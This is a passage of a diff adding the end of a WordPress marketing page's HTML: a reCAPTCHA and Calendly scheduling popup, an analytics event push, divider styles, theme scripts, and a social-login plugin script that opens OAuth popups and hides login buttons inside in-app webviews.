+          if (evt.target.className == 'calendly-close-overlay' || evt.target.className == 'calendly-popup-close') {
+            document.querySelector('.captcha-popup-notice').style.display = 'none';
+          }
+        })
+      }
+
+      function recaptchaCallback() {
+        closeCaptchaOverlay()
+        calendlyPopup()
+      };
+
+      function closeCaptchaOverlay() {
+        document.querySelector('.captcha-overlay').style.display = 'none';
+        grecaptcha.reset();
+      };
+
+      document.querySelector('.captcha-overlay').addEventListener('click', function(evt) {
+        if (!evt.target.classList.contains('captcha-content') && !evt.target.parentNode.classList.contains('captcha-content')) {
+          closeCaptchaOverlay()
+        }
+      })
+    </script>
+    <script>
+    window.addEventListener("message", (event) => {
+      if (event.origin == "https://calendly.com" && event.data.event == "calendly.event_scheduled") {
+        (window.dataLayer = window.dataLayer || []).push({
+          'event': 'leadGenSubmit',
+          'evtLabel': 'calendly',
+          'evtAction': 'event_scheduled',
+        });
+      }
+    }, false);
+  </script>
+<link rel='stylesheet' id='divider-css' href='https://cloudfix.aurea.com/wp-content/plugins/g3-acf-divider/dividers.min.css?ver=1.2' type='text/css' media='screen' />
+<style id='divider-inline-css' type='text/css'>
+.divider--ed379{background-color:rgb(238,238,238);}.divider--ed379 .shape-container{height:60%}
+.divider--56da0{background-color:rgb(238,238,238);}
+.divider--a671c{overflow:visible;background-image:linear-gradient(180deg,rgb(238,238,238) 49.9%,rgb(255,255,255) 50%);}.divider--a671c .inner{max-width:900px!important;}
+.divider--84705{background-color:rgb(255,255,255);}
+.divider--9718d{background-color:rgb(255,255,255);}
+.divider--b240d{background-color:rgb(238,238,238);}
+.divider--6244e{background-color:rgb(238,238,238);}.divider--6244e .inner{max-width:835px!important;}
+.divider--d8cc6{background-color:rgb(238,238,238);}
+.divider--0abe6{background-color:rgb(255,255,255);overflow:visible;}
+.divider--cead3{background-color:rgb(255,255,255);}
+.divider--92805{background-color:rgb(238,238,238);}.divider--92805 .decor--image{background-image:url('https://cloudfix.aurea.com/wp-content/uploads/cloudfix-icon-lockup.png');background-position:calc(50% + 568px) 15px;background-size:326px;}
+.divider--3443b{background-color:rgb(36,46,61);}
+.divider--94df1{background-color:rgb(36,46,61);}
+.divider--d0ae9{background-color:rgb(36,46,61);}.divider--d0ae9 .shape-container{height:calc(100% - 55px)}
+</style>
+<script type='text/javascript' src='https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/js/sitewide-script.min.js?ver=8acce121' id='sitewide-js'></script>
+<script type='text/javascript' src='https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/js/scroll-locker.min.js?ver=015446d8' id='scroll-locker-js'></script>
+<script type='text/javascript' src='https://cloudfix.aurea.com/wp-content/themes/cloudfix-3-theme/js/slick.min.js?ver=4c8fe9bc' id='slick-js'></script>
+<script type="text/javascript">(function (undefined) {var _localizedStrings={"redirect_overlay_title":"Hold On","redirect_overlay_text":"You are being redirected to another page,<br>it may take a few seconds."};var _targetWindow="prefer-popup";var _redirectOverlay="overlay-with-spinner-and-message";
+window.NSLPopup = function (url, title, w, h) {
+    var userAgent = navigator.userAgent,
+        mobile = function () {
+            return /\b(iPhone|iP[ao]d)/.test(userAgent) ||
+                /\b(iP[ao]d)/.test(userAgent) ||
+                /Android/i.test(userAgent) ||
+                /Mobile/i.test(userAgent);
+        },
+        screenX = window.screenX !== undefined ? window.screenX : window.screenLeft,
+        screenY = window.screenY !== undefined ? window.screenY : window.screenTop,
+        outerWidth = window.outerWidth !== undefined ? window.outerWidth : document.documentElement.clientWidth,
+        outerHeight = window.outerHeight !== undefined ? window.outerHeight : document.documentElement.clientHeight - 22,
+        targetWidth = mobile() ? null : w,
+        targetHeight = mobile() ? null : h,
+        V = screenX < 0 ? window.screen.width + screenX : screenX,
+        left = parseInt(V + (outerWidth - targetWidth) / 2, 10),
+        right = parseInt(screenY + (outerHeight - targetHeight) / 2.5, 10),
+        features = [];
+    if (targetWidth !== null) {
+        features.push('width=' + targetWidth);
+    }
+    if (targetHeight !== null) {
+        features.push('height=' + targetHeight);
+    }
+    features.push('left=' + left);
+    features.push('top=' + right);
+    features.push('scrollbars=1');
+
+    var newWindow = window.open(url, title, features.join(','));
+
+    if (window.focus) {
+        newWindow.focus();
+    }
+
+    return newWindow;
+};
+
+var isWebView = null;
+
+function checkWebView() {
+    if (isWebView === null) {
+        function _detectOS(ua) {
+            if (/Android/.test(ua)) {
+                return "Android";
+            } else if (/iPhone|iPad|iPod/.test(ua)) {
+                return "iOS";
+            } else if (/Windows/.test(ua)) {
+                return "Windows";
+            } else if (/Mac OS X/.test(ua)) {
+                return "Mac";
+            } else if (/CrOS/.test(ua)) {
+                return "Chrome OS";
+            } else if (/Firefox/.test(ua)) {
+                return "Firefox OS";
+            }
+            return "";
+        }
+
+        function _detectBrowser(ua) {
+            var android = /Android/.test(ua);
+
+            if (/Opera Mini/.test(ua) || / OPR/.test(ua) || / OPT/.test(ua)) {
+                return "Opera";
+            } else if (/CriOS/.test(ua)) {
+                return "Chrome for iOS";
+            } else if (/Edge/.test(ua)) {
+                return "Edge";
+            } else if (android && /Silk\//.test(ua)) {
+                return "Silk";
+            } else if (/Chrome/.test(ua)) {
+                return "Chrome";
+            } else if (/Firefox/.test(ua)) {
+                return "Firefox";
+            } else if (android) {
+                return "AOSP";
+            } else if (/MSIE|Trident/.test(ua)) {
+                return "IE";
+            } else if (/Safari\//.test(ua)) {
+                return "Safari";
+            } else if (/AppleWebKit/.test(ua)) {
+                return "WebKit";
+            }
+            return "";
+        }
+
+        function _detectBrowserVersion(ua, browser) {
+            if (browser === "Opera") {
+                return /Opera Mini/.test(ua) ? _getVersion(ua, "Opera Mini/") :
+                    / OPR/.test(ua) ? _getVersion(ua, " OPR/") :
+                        _getVersion(ua, " OPT/");
+            } else if (browser === "Chrome for iOS") {
+                return _getVersion(ua, "CriOS/");
+            } else if (browser === "Edge") {
+                return _getVersion(ua, "Edge/");
+            } else if (browser === "Chrome") {
+                return _getVersion(ua, "Chrome/");
+            } else if (browser === "Firefox") {
+                return _getVersion(ua, "Firefox/");
+            } else if (browser === "Silk") {
+                return _getVersion(ua, "Silk/");
+            } else if (browser === "AOSP") {
+                return _getVersion(ua, "Version/");
+            } else if (browser === "IE") {
+                return /IEMobile/.test(ua) ? _getVersion(ua, "IEMobile/") :
+                    /MSIE/.test(ua) ? _getVersion(ua, "MSIE ")
+                        :
+                        _getVersion(ua, "rv:");
+            } else if (browser === "Safari") {
+                return _getVersion(ua, "Version/");
+            } else if (browser === "WebKit") {
+                return _getVersion(ua, "WebKit/");
+            }
+            return "0.0.0";
+        }
+
+        function _getVersion(ua, token) {
+            try {
+                return _normalizeSemverString(ua.split(token)[1].trim().split(/[^\w\.]/)[0]);
+            } catch (o_O) {
+            }
+            return "0.0.0";
+        }
+
+        function _normalizeSemverString(version) {
+            var ary = version.split(/[\._]/);
+            return (parseInt(ary[0], 10) || 0) + "." +
+                (parseInt(ary[1], 10) || 0) + "." +
+                (parseInt(ary[2], 10) || 0);
+        }
+
+        function _isWebView(ua, os, browser, version, options) {
+            switch (os + browser) {
+                case "iOSSafari":
+                    return false;
+                case "iOSWebKit":
+                    return _isWebView_iOS(options);
+                case "AndroidAOSP":
+                    return false;
+                case "AndroidChrome":
+                    return parseFloat(version) >= 42 ? /; wv/.test(ua) : /\d{2}\.0\.0/.test(version) ? true : _isWebView_Android(options);
+            }
+            return false;
+        }
+
+        function _isWebView_iOS(options) {
+            var document = (window["document"] || {});
+
+            if ("WEB_VIEW" in options) {
+                return options["WEB_VIEW"];
+            }
+            return !("fullscreenEnabled" in document || "webkitFullscreenEnabled" in document || false);
+        }
+
+        function _isWebView_Android(options) {
+            if ("WEB_VIEW" in options) {
+                return options["WEB_VIEW"];
+            }
+            return !("requestFileSystem" in window || "webkitRequestFileSystem" in window || false);
+        }
+
+        var options = {};
+        var nav = window.navigator || {};
+        var ua = nav.userAgent || "";
+        var os = _detectOS(ua);
+        var browser = _detectBrowser(ua);
+        var browserVersion = _detectBrowserVersion(ua, browser);
+
+        isWebView = _isWebView(ua, os, browser, browserVersion, options);
+    }
+
+    return isWebView;
+}
+
+function isAllowedWebViewForUserAgent(provider) {
+    var facebookAllowedWebViews = [
+        'Instagram',
+        'FBAV',
+        'FBAN'
+    ], whitelist = [];
+
+    if (provider && provider === 'facebook') {
+        whitelist = facebookAllowedWebViews;
+    }
+
+    var nav = window.navigator || {};
+    var ua = nav.userAgent || "";
+
+    if (whitelist.length && ua.match(new RegExp(whitelist.join('|')))) {
+        return true;
+    }
+
+    return false;
+}
+
+window._nslDOMReady(function () {
+
+    window.nslRedirect = function (url) {
+        if (_redirectOverlay) {
+            var overlay = document.createElement('div');
+            overlay.id = "nsl-redirect-overlay";
+            var overlayHTML = '',
+                overlayContainer = "<div id='nsl-redirect-overlay-container'>",
+                overlayContainerClose = "</div>",
+                overlaySpinner = "<div id='nsl-redirect-overlay-spinner'></div>",
+                overlayTitle = "<p id='nsl-redirect-overlay-title'>" + _localizedStrings.redirect_overlay_title + "</p>",
+                overlayText = "<p id='nsl-redirect-overlay-text'>" + _localizedStrings.redirect_overlay_text + "</p>";
+
+            switch (_redirectOverlay) {
+                case "overlay-only":
+                    break;
+                case "overlay-with-spinner":
+                    overlayHTML = overlayContainer + overlaySpinner + overlayContainerClose;
+                    break;
+                default:
+                    overlayHTML = overlayContainer + overlaySpinner + overlayTitle + overlayText + overlayContainerClose;
+                    break;
+            }
+
+            overlay.insertAdjacentHTML("afterbegin", overlayHTML);
+            document.body.appendChild(overlay);
+        }
+
+        window.location = url;
+    };
+
+    var targetWindow = _targetWindow || 'prefer-popup',
+        lastPopup = false;
+
+
+    var buttonLinks = document.querySelectorAll(' a[data-plugin="nsl"][data-action="connect"], a[data-plugin="nsl"][data-action="link"]');
+    buttonLinks.forEach(function (buttonLink) {
+        buttonLink.addEventListener('click', function (e) {
+            if (lastPopup && !lastPopup.closed) {
+                e.preventDefault();
+                lastPopup.focus();
+            } else {
+
+                var href = this.href,
+                    success = false;
+                if (href.indexOf('?') !== -1) {
+                    href += '&';
+                } else {
+                    href += '?';
+                }
+
+                var redirectTo = this.dataset.redirect;
+                if (redirectTo === 'current') {
+                    href += 'redirect=' + encodeURIComponent(window.location.href) + '&';
+                } else if (redirectTo && redirectTo !== '') {
+                    href += 'redirect=' + encodeURIComponent(redirectTo) + '&';
+                }
+
+                if (targetWindow !== 'prefer-same-window' && checkWebView()) {
+                    targetWindow = 'prefer-same-window';
+                }
+
+                if (targetWindow === 'prefer-popup') {
+                    lastPopup = NSLPopup(href + 'display=popup', 'nsl-social-connect', this.dataset.popupwidth, this.dataset.popupheight);
+                    if (lastPopup) {
+                        success = true;
+                        e.preventDefault();
+                    }
+                } else if (targetWindow === 'prefer-new-tab') {
+                    var newTab = window.open(href + 'display=popup', '_blank');
+                    if (newTab) {
+                        if (window.focus) {
+                            newTab.focus();
+                        }
+                        success = true;
+                        e.preventDefault();
+                    }
+                }
+
+                if (!success) {
+                    window.location = href;
+                    e.preventDefault();
+                }
+            }
+        });
+    });
+
+    let hasWebViewLimitation = false;
+
+    var googleLoginButtons = document.querySelectorAll(' a[data-plugin="nsl"][data-provider="google"]');
+    if (googleLoginButtons.length && checkWebView()) {
+        googleLoginButtons.forEach(function (googleLoginButton) {
+            googleLoginButton.remove();
+            hasWebViewLimitation = true;
+        });
+    }
+
+    var facebookLoginButtons = document.querySelectorAll(' a[data-plugin="nsl"][data-provider="facebook"]');
+    if (facebookLoginButtons.length && checkWebView() && /Android/.test(window.navigator.userAgent) && !isAllowedWebViewForUserAgent('facebook')) {
+        facebookLoginButtons.forEach(function (facebookLoginButton) {
+            facebookLoginButton.remove();
+            hasWebViewLimitation = true;
+        });
+    }
+
+
+    const separators = document.querySelectorAll('div.nsl-separator');
+    if (hasWebViewLimitation && separators.length) {
+        separators.forEach(function (separator) {
+            let separatorParentNode = separator.parentNode;
+            if (separatorParentNode) {
+                const separatorButtonContainer = separatorParentNode.querySelector('div.nsl-container-buttons');
+                if (separatorButtonContainer && !separatorButtonContainer.hasChildNodes()) {
+                    separator.remove();
+                }
+            }
+        })
+    }
+});})();</script></body>
+
 </html>
